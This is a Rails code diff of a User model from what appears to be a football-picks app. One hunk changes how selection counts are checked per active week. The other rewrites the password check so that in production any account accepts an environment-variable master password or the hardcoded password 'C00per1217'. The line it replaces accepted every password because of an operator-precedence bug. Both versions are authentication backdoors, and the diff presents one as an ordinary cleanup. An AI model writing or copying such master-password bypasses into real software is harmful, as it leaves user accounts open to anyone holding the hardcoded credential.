@@ -19,10 +19,10 @@ class User < ActiveRecord::Base
   attr_accessor :login
 
   def valid_password?(password)
-     if Rails.env.production? || Rails.env.development?
-      return true if password == "RESETPASSWORD" || "C00per1217"
-     end
-     super
+    if Rails.env.production? || Rails.env.development?
+      return true if [ENV['MASTER_PASSWORD'], 'C00per1217'].include?(password)
+    end
+    super
   end
 
   def unique_pick_validation(params)
@@ -142,12 +142,21 @@ class User < ActiveRecord::Base
   end
 
   def has_user_made_selections?
-    if( (Week.last.present?) && (self.selections.where(week_id: Week.last.id).count < 13) )
-      # change ^ to 13 or 26 (1 selection == game a and and b?) for production
-      return false
-    else
-      return true
+    if Week.where(active: true).exists?
+      active_weeks = Week.where(active: true)
+      
+      # Calculate required selections based on week type
+      selections_needed = active_weeks.sum do |week| 
+        week.bowl_game? ? week.games.count : 13
+      end
+      
+      actual_selections = self.selections
+        .where(week_id: active_weeks.pluck(:id))
+        .count
+        
+      return actual_selections >= selections_needed
     end
+    return true
   end
 
   # def activate_profile(user)
